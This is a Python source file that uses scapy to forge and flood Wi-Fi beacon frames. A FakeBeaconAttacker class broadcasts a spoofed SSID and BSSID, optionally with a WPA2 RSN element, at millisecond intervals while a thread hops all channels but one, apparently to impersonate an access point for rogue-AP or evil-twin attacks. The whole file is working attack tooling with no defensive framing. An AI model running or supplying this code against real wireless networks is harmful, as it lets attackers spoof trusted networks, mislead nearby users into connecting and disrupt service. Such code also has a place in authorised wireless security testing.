from threading import Thread
import os
from time import sleep
from scapy.all import *
from scapy.layers.dot11 import *

CHANNELS_2GHZ = list(range(1, 13))
CHANNELS_5GHZ = list(range(36, 64))


def ChanelHopper(channel_range: list[int], interface: str, timeout):
    while True:
        for i in channel_range:
            os.system(f"iwconfig {interface} channel {i}")
            sleep(timeout)


def CreateBeacon(bssid: str, ssid: str, encryption_enabled: bool = True):
    broadcast = "ff:ff:ff:ff:ff:ff".upper()
    dot11 = Dot11(type=0, subtype=8, addr1=broadcast, addr2=bssid, addr3=bssid)
    beacon = Dot11Beacon()

    dot11elt = Dot11Elt(ID="SSID", info=str.encode(ssid), len=len(str.encode(ssid)))
    frame = RadioTap() / dot11 / beacon / dot11elt
    if encryption_enabled:  # включение поддержки шифрования в beacon кадре
        rsn_array = [b'\x01\x00',
                     b'\x00\x0f\xac\x04',
                     b'\x02\x00',
                     b'\x00\x0f\xac\x04',
                     b'\x00\x0f\xac\x02',
                     b'\x01\x00',
                     b'\x00\x0f\xac\x02',
                     b'\x00\x00']
        rsn_bytes = b''.join(rsn_array)
        rsn = Dot11Elt(ID='RSNinfo', info=rsn_bytes, len=len(rsn_bytes))
        frame = frame / rsn
    return frame


class FakeBeaconAttacker:
    channel_timeout = 2
    frequency = 2.4
    encryption = True
    send_interval = 0.001

    def __init__(self, ssid: str, bssid: str, exclude_channel: int, interface: str, **kwargs):
        self.ssid = ssid
        self.bssid = bssid
        self.exclude_channel = exclude_channel
        self.interface = interface
        for i in kwargs.keys():
            if getattr(self, i, None) is not None:
                setattr(self, i, kwargs[i])

    def launch(self):
        channels = list()
        if self.frequency == 2.4:
            channels = CHANNELS_2GHZ
            channels.remove(self.exclude_channel)
        elif self.frequency == 5.0:
            channels = CHANNELS_5GHZ
            channels.remove(self.exclude_channel)
        else:
            raise Exception("PLEASE SPECIFY CORRECT FREQUENCY")

        t1 = Thread(target=ChanelHopper, args=(channels, self.interface, self.channel_timeout))
        frame = CreateBeacon(ssid=self.ssid, bssid=self.bssid, encryption_enabled=self.encryption)
        t1.start()
        sendp(frame, iface=self.interface, inter=self.send_interval, loop=1)
        t1.join()
